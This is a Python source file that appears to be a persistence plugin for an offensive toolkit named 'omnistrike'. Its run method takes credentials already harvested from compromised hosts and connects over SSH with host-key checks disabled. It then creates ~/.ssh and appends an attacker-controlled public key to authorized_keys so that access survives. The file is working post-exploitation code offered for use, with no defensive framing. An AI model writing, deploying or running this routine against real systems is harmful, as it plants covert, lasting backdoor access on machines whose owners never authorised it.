import asyncio
import asyncssh
from omnistrike.plugins.base import BasePlugin

class FootholdPlugin(BasePlugin):
    def __init__(self):
        self.proxy_manager = None
        # Example public key (in a real scenario, this would be the user's key)
        self.ssh_public_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3... omnistrike@local"

    @property
    def name(self):
        return "Foothold"

    @property
    def description(self):
        return "Establishes persistence by adding an authorized SSH key to compromised hosts."

    async def run(self, target, data):
        compromised_hosts = data.get('compromised_hosts', {})
        if not compromised_hosts:
            print("[*] No compromised hosts found. Skipping foothold establishment.")
            return

        print(f"[*] Establishing persistent footholds on {len(compromised_hosts)} host(s)...")
        foothold_results = {}

        for ip, creds in compromised_hosts.items():
            for cred in creds:
                if cred['service'] == 'ssh':
                    print(f"[*] Deploying authorized key to {ip} as {cred['username']}...")
                    try:
                        async with asyncssh.connect(ip, username=cred['username'], password=cred['password'], known_hosts=None) as conn:
                            # Create .ssh directory and append key to authorized_keys
                            cmd = f'mkdir -p ~/.ssh && chmod 700 ~/.ssh && echo "{self.ssh_public_key}" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys'
                            await conn.run(cmd)
                            print(f"[!!!] FOOTHOLD ESTABLISHED: Persistence deployed to {ip}")
                            foothold_results[ip] = "SSH Authorized Key Deployed"
                            break # One foothold per IP
                    except Exception as e:
                        print(f"[!] Failed to establish foothold on {ip}: {e}")

        data['foothold_status'] = foothold_results
